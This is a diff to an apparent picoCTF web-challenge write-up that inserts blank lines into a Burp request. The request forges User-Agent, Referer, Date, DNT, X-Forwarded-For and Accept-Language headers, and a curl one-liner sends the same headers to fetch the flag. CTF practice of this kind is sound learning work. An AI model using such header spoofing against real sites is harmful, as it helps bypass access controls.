@@ -37,20 +37,35 @@ This one's easy, you have to change the Accept-Language header, if you look onli
 
 
 Final request (in Burp):
+
 GET / HTTP/1.1
+
 Host: mercury.picoctf.net:34588
+
 Cache-Control: max-age=0
+
 Upgrade-Insecure-Requests: 1
+
 User-Agent: PicoBrowser
+
 Referer: http://mercury.picoctf.net:34588
+
 Date: Tue, 15 Nov 2018 08:12:31 GMT
+
 DNT: 1
+
 X-Forwarded-For: 31.15.63.255
+
 Accept-Language: sv-SE
+
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
 Accept-Encoding: gzip, deflate
+
 Accept-Language: en-US,en;q=0.9
+
 Connection: close
+
 
 In a curl command:
 curl -i -s -H "Accept: application/json" -H "Content-Type: application/json" -H "User-Agent: PicoBrowser" -H "Referer: http://mercury.picoctf.net:34588" -H "Date: Tue, 15 Nov 2018 08:12:31 GMT" -H "DNT: 1" -H "X-Forwarded-For: 31.15.63.255"  -H "Accept-Language: sv-SE" http://mercury.picoctf.net:34588/ | grep pico
